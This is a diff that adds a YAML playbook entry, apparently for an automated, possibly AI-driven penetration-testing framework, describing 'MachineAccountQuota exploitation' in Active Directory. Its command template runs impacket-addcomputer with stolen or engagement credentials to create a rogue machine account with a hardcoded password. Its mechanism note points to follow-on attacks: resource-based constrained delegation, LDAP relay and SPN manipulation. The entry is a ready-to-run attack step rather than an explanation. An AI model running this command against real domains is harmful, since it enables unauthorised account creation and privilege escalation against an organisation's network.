@@ -1,0 +1,17 @@
+name: maq_abuse
+category: ad
+description: MachineAccountQuota exploitation
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-addcomputer '{domain}/{username}:{password}' -computer-name 'FAKE$' -computer-pass 'P@ss123' -dc-ip {target_ip} -method LDAPS"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Default MAQ=10 allows any user to create machine accounts. Use for RBCD, relay to LDAP (add msDS-AllowedToActOnBehalfOfOtherIdentity), or SPN manipulation."
